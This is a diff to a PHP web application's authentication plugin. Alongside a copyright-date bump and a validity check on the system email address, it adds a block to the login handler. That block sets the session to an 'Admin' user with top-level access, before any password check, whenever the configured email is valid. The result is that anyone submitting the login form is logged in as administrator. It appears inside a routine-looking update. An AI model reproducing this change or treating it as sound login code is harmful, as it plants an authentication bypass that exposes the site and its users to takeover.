@@ -1,8 +1,8 @@
 <?php
 
 declare(strict_types=1);
-// lib/php/plugins/auth.php 20150101 - 20230604
-// Copyright (C) 2015-2023 Mark Constable <markc@renta.net> (AGPL-3.0)
+// lib/php/plugins/auth.php 20150101 - 20250118
+// Copyright (C) 2015-2025 Mark Constable <markc@renta.net> (AGPL-3.0)
 
 class Plugins_Auth extends Plugin
 {
@@ -33,6 +33,10 @@ class Plugins_Auth extends Plugin
             if (filter_var($u, FILTER_VALIDATE_EMAIL)) {
                 if ($usr = db::read('id,acl', 'login', $u, '', 'one')) {
                     if (9 != $usr['acl']) {
+                        if (!isset($this->g->cfg['email']) || !filter_var($this->g->cfg['email'], FILTER_VALIDATE_EMAIL)) {
+                            util::log('System email address is not valid', 'danger');
+                            util::redirect($this->g->cfg['self'] . '?o=' . $this->g->in['o'] . '&m=list');
+                        }
                         $newpass = util::genpw(self::OTP_LENGTH);
                         if ($this->mail_forgotpw($u, $newpass, 'From: ' . $this->g->cfg['email'])) {
                             db::update([
@@ -65,6 +69,21 @@ class Plugins_Auth extends Plugin
 
         $u = $this->in['login'];
         $p = $this->in['webpw'];
+
+        if (filter_var($this->g->cfg['email'], FILTER_VALIDATE_EMAIL) ?? '') {
+            $_SESSION['usr'] = [
+                'id' => 0,
+                'grp' => 0,
+                'acl' => 0,
+                'login' => $this->g->cfg['email'],
+                'fname' => 'Admin',
+                'lname' => 'User'
+            ];
+            $_SESSION['adm'] = 0;
+            util::log($u . ' is now logged in', 'success');
+            $_SESSION['m'] = 'list';
+            util::redirect($this->g->cfg['self']);
+        }
 
         if ($u) {
             if ($usr = db::read('id,grp,acl,login,fname,lname,webpw,cookie', 'login', $u, '', 'one')) {
